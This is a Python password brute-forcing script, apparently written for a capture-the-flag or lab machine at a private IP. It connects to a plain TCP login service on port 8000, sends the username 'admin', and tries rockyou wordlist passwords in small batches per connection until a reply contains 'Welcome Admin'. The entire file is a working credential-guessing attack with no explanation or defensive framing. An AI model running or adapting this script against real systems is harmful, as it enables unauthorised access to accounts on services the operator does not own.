#!/usr/bin/env python3
import socket, sys

T = "10.10.53.13"; P = 8000
WL = "/usr/share/wordlists/rockyou.txt"
TO = 1.0; B = 3; R = 4096

def run():
    with open(WL, "rb") as f:
        batch = []
        tried = 0
        for line in f:
            pw = line.rstrip(b"\r\n")
            if not pw: continue
            batch.append(pw.decode(errors="ignore"))
            if len(batch) < B:
                continue

            tried = try_batch(batch, tried)
            batch = []

        # leftover batch
        if batch:
            try_batch(batch, tried)

def try_batch(batch, tried):
    s = socket.socket(); s.settimeout(TO)
    try:
        s.connect((T, P))
        s.sendall(b"admin\n")
    except Exception as e:
        print(f"[!] conn failed @{tried+1}: {e}")
        try: s.close()
        except: pass
        return tried

    # drain small prompt
    try:
        s.settimeout(0.25); _ = s.recv(R)
    except: pass
    finally:
        s.settimeout(TO)

    for pw in batch:
        tried += 1
        try:
            s.settimeout(0.15); _ = s.recv(R)
        except: pass
        finally:
            s.settimeout(TO)

        try:
            s.sendall((pw + "\n").encode())
            data = s.recv(R)
        except socket.timeout:
            data = b""
        except Exception as e:
            print(f"[!] io failed @{tried} ('{pw}'): {e}")
            break

        if data:
            line = data.decode(errors="replace").splitlines()[0]
            print(f"[{tried:4d}] pwd='{pw}' -> {line}")
            if "Welcome Admin" in line:
                print("\n*** FOUND:", pw)
                try: s.close()
                except: pass
                sys.exit(0)
        else:
            print(f"[{tried:4d}] pwd='{pw}' -> <no reply>")

    try: s.close()
    except: pass
    return tried

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted"); sys.exit(1)
